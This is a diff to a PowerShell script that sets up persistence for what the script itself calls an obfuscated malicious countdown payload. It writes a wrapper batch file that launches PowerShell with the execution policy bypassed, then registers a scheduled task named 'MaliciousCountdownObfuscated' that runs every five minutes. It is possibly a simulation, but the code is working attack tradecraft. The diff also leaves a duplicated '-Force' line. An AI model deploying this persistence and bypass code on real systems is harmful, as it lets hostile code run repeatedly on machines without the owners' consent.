@@ -25,17 +25,25 @@ Copy-Item -Path $destFileInTemp -Destination $installedFile
 
 # Step 6: Create a wrapper batch file to execute the obfuscated script
 $taskScript = "$env:TEMP\countdown_wrapper.bat"
+if (Test-Path $taskScript) { Remove-Item $taskScript -Force }
 Set-Content -Path $taskScript -Value "@echo off`nstart powershell.exe -ExecutionPolicy Bypass -File `"$destFileInTemp`"`nexit"
 
-# Step 7: Create Scheduled Task to run the obfuscated script every 5 minutes, for 3 cycles (15 minutes total)
+# Step 7: Remove old scheduled task if exists
+$taskName = "MaliciousCountdownObfuscated"
+if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+}
+
+# Step 8: Create Scheduled Task to run the obfuscated script every 5 minutes, for 3 cycles (15 minutes total)
 $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $taskScript"
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
     -RepetitionInterval (New-TimeSpan -Minutes 5) `
     -RepetitionDuration (New-TimeSpan -Minutes 15)
 
-Register-ScheduledTask -TaskName "MaliciousCountdownObfuscated" `
+Register-ScheduledTask -TaskName $taskName `
     -Action $action `
     -Trigger $trigger `
     -Description "Run obfuscated malicious countdown script every 5 minutes for 3 times" `
+    -Force
     -Force
 
